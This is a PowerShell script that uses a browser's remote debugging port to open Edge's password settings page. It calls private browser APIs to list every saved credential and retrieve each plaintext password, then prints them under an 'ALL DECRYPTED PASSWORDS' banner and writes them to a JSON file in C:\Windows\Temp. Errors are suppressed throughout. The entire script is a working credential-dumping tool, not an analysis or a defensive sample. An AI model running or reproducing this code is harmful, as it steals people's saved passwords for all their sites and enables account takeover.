$ErrorActionPreference = 'SilentlyContinue'

# Connect to browser WebSocket
$ver = (curl.exe -s http://127.0.0.1:9222/json/version | ConvertFrom-Json)
$ws = New-Object System.Net.WebSockets.ClientWebSocket
$ct = [System.Threading.CancellationToken]::None
$ws.ConnectAsync([Uri]$ver.webSocketDebuggerUrl, $ct).Wait()

$buf = [byte[]]::new(10485760)
$script:mid = 0
$script:sid = ""

function Read-Msg {
    $s2 = [ArraySegment[byte]]::new($buf)
    $r = $ws.ReceiveAsync($s2, $ct).Result
    return [System.Text.Encoding]::UTF8.GetString($buf, 0, $r.Count)
}

function Send-Cmd {
    param([hashtable]$msg)
    $script:mid++
    $msg.id = $script:mid
    if ($script:sid) { $msg.sessionId = $script:sid }
    $j = ConvertTo-Json -Compress -InputObject $msg -Depth 5
    $b = [System.Text.Encoding]::UTF8.GetBytes($j)
    $s = [ArraySegment[byte]]::new($b)
    $ws.SendAsync($s, 'Text', $true, $ct).Wait()
    return Read-Msg
}

function Send-Eval {
    param([string]$js)
    return Send-Cmd @{ method = "Runtime.evaluate"; params = @{ expression = $js; awaitPromise = $true; returnByValue = $true } }
}

# ═══ 1. Create target for edge://settings/passwords ═══
Write-Output "[1] creating edge://settings/passwords target..."
$resp1 = Send-Cmd @{ method = "Target.createTarget"; params = @{ url = "edge://settings/passwords" } }
$r1 = $resp1 | ConvertFrom-Json
$targetId = $r1.result.targetId
Write-Output "    targetId: $targetId"
Start-Sleep 12

# ═══ 2. Attach and get sessionId ═══
Write-Output "[2] attaching..."
$script:mid++
$attachMsg = @{ id = $script:mid; method = "Target.attachToTarget"; params = @{ targetId = $targetId; flatten = $true } }
$attachJ = ConvertTo-Json -Compress -InputObject $attachMsg -Depth 5
$attachB = [System.Text.Encoding]::UTF8.GetBytes($attachJ)
$attachS = [ArraySegment[byte]]::new($attachB)
$ws.SendAsync($attachS, 'Text', $true, $ct).Wait()

for ($i = 0; $i -lt 10; $i++) {
    $msg = Read-Msg
    if ($msg.Contains("Target.attachedToTarget")) {
        $evt = $msg | ConvertFrom-Json
        $script:sid = $evt.params.sessionId
        Write-Output "    sessionId: $script:sid"
        break
    }
    if ($msg.Contains("`"id`":$script:mid")) { break }
}

if (-not $script:sid) { Write-Output "no sid"; $ws.Dispose(); exit }

# ═══ 3. Enable Runtime ═══
$null = Send-Cmd @{ method = "Runtime.enable" }

# ═══ 4. Verify URL and API ═══
$urlResp = Send-Eval 'window.location.href'
$urlObj = $urlResp | ConvertFrom-Json
$pageUrl = $urlObj.result.result.value
Write-Output "[3] page URL: $pageUrl"

$apiResp = Send-Eval 'JSON.stringify({pm: !!chrome.passwordsManagerPrivate, pp: !!chrome.passwordsPrivate})'
$apiObj = $apiResp | ConvertFrom-Json
Write-Output "[3] APIs: $($apiObj.result.result.value)"

# ═══ 5. Get password list ═══
Write-Output "[4] getting password list..."
$listResp = Send-Eval @'
new Promise(async (resolve) => {
    try {
        const results = {};
        // Try passwordsManagerPrivate
        if (chrome.passwordsManagerPrivate) {
            results.source = "passwordsManagerPrivate";
            const list = await new Promise((res, rej) => {
                chrome.passwordsManagerPrivate.getSavedPasswordList(function(entries) {
                    if (chrome.runtime.lastError) rej(chrome.runtime.lastError.message);
                    else res(entries || []);
                });
            });
            results.count = list.length;
            results.data = list;
        }
        // Also try passwordsPrivate
        else if (chrome.passwordsPrivate) {
            results.source = "passwordsPrivate";
            const list = await new Promise((res, rej) => {
                chrome.passwordsPrivate.getSavedPasswordList(function(entries) {
                    if (chrome.runtime.lastError) rej(chrome.runtime.lastError.message);
                    else res(entries || []);
                });
            });
            results.count = list.length;
            results.data = list;
        }
        else {
            results.error = "no API";
        }
        resolve(JSON.stringify(results));
    } catch(e) {
        resolve(JSON.stringify({error: e.message, stack: e.stack ? e.stack.substring(0, 200) : ""}));
    }
})
'@
$listObj = $listResp | ConvertFrom-Json
$listVal = $listObj.result.result.value
Write-Output "    list: $($listVal.Substring(0, [Math]::Min(500, [string]$listVal)))"

if (-not $listVal) {
    Write-Output "    null response"
    # Show full response for debugging
    Write-Output "    full: $($listResp.Substring(0, [Math]::Min(500, $listResp.Length)))"
}

if ($listVal) {
    $listData = $listVal | ConvertFrom-Json
    if ($listData.error) {
        Write-Output "    error: $($listData.error)"
    } elseif ($listData.count -gt 0) {
        $passwords = $listData.data
        $source = $listData.source
        Write-Output "[+] $($listData.count) passwords via $source"

        # ═══ 6. Extract each password ═══
        $results = [System.Collections.ArrayList]::new()

        for ($i = 0; $i -lt $passwords.Count; $i++) {
            $entry = $passwords[$i]
            $eid = $entry.id
            $eurl = if ($entry.urls -and $entry.urls.Count -gt 0) { $entry.urls[0] } else { $entry.login } 
            if (-not $eurl) { $eurl = "unknown" }
            $euser = $entry.username

            Write-Output "[*] [$($i+1)/$($passwords.Count)] $eurl ($euser)..."

            # Use the correct plaintext method based on source
            $getJs = @"
new Promise(async (resolve) => {
    try {
        const api = chrome.$source;
        // Edge: requestPlaintextPassword(id, reason, callback)
        if (api.requestPlaintextPassword) {
            api.requestPlaintextPassword($eid, 0, function(pw) {
                if (chrome.runtime.lastError) {
                    // Try without reason
                    api.requestPlaintextPassword($eid, function(pw2) {
                        if (chrome.runtime.lastError) {
                            resolve(JSON.stringify({err: chrome.runtime.lastError.message}));
                        } else {
                            resolve(JSON.stringify({p: pw2}));
                        }
                    });
                } else {
                    resolve(JSON.stringify({p: pw}));
                }
            });
        }
        // Chrome: getPlaintextPassword(id, callback)
        else if (api.getPlaintextPassword) {
            api.getPlaintextPassword($eid, function(pw) {
                if (chrome.runtime.lastError) {
                    resolve(JSON.stringify({err: chrome.runtime.lastError.message}));
                } else {
                    resolve(JSON.stringify({p: pw}));
                }
            });
        }
        else {
            resolve(JSON.stringify({err: "no plaintext method"}));
        }
    } catch(e) {
        resolve(JSON.stringify({err: e.message}));
    }
})
"@

            $getResp = Send-Eval $getJs
            $getObj = $getResp | ConvertFrom-Json
            $getVal = $getObj.result.result.value

            if ($getVal) {
                $pwData = $getVal | ConvertFrom-Json
                if ($pwData.p -ne $null -and $pwData.p -ne "") {
                    [void]$results.Add([PSCustomObject]@{url=$eurl; username=$euser; password=$pwData.p})
                    Write-Output "    *** PASSWORD: $($pwData.p)"
                } elseif ($pwData.err) {
                    Write-Output "    err: $($pwData.err)"
                    [void]$results.Add([PSCustomObject]@{url=$eurl; username=$euser; password="<err: $($pwData.err)>"})
                } else {
                    Write-Output "    no data"
                }
            } else {
                Write-Output "    null response"
                Write-Output "    raw: $($getResp.Substring(0, [Math]::Min(300, $getResp.Length)))"
            }
        }

        # ═══ 7. Output ═══
        Write-Output ""
        Write-Output "================================================================"
        Write-Output "           ALL DECRYPTED PASSWORDS"
        Write-Output "================================================================"
        foreach ($r in $results) {
            Write-Output "  $($r.url) | $($r.username) | $($r.password)"
        }

        $results | ConvertTo-Json -Depth 3 | Out-File "C:\Windows\Temp\ziti\pwd_extracted_final.json" -Encoding utf8
        Write-Output "[+] saved to pwd_extracted_final.json"
    } else {
        Write-Output "0 passwords in list"
    }
}

$ws.Dispose()
Write-Output "[+] done"